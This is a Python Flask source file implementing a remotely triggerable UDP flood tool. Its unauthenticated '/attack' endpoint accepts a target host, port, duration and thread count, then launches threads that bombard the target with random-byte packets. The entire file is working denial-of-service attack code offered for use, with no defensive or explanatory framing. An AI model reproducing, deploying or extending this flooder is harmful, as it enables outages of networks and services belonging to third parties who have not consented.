from flask import Flask, request, jsonify
from time import time as tt
import socket
import random
import os
import threading

app = Flask(__name__)

def send_packets(ip, port, duration, packet_size):
    startup = tt()
    while True:
        nulled = b""
        data = random._urandom(int(random.randint(500, 1024)))
        data2 = random._urandom(int(random.randint(1025, 65505)))
        data3 = os.urandom(int(random.randint(1025, 65505)))
        data4 = random._urandom(int(random.randint(1, 65505)))
        data5 = os.urandom(int(random.randint(1, 65505)))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            endtime = tt()
            if (startup + duration) < endtime:
                break

            for _ in range(packet_size):
                sock.sendto(nulled, (ip, port))
                sock.sendto(data, (ip, port))
                sock.sendto(data2, (ip, port))
                sock.sendto(data3, (ip, port))
                sock.sendto(data4, (ip, port))
                sock.sendto(data5, (ip, port))
        except:
            pass
        
def attack(ip, port, duration, packet_size, threads):
    if duration is None:
        duration = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, duration, packet_size))
        th.start()

@app.route('/attack', methods=['GET'])
def attack_route():
    ip = request.args.get('host')
    port = int(request.args.get('port', 80))
    duration = int(request.args.get('time', 60))
    packet_size = int(request.args.get('packet_size', 1024))
    threads = int(request.args.get('threads', 1))

    if not ip:
        return jsonify({'error': 'host parameter is required'}), 400

    try:
        attack(ip, port, duration, packet_size, threads)
        return jsonify({'status': 'Attack successfully started'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
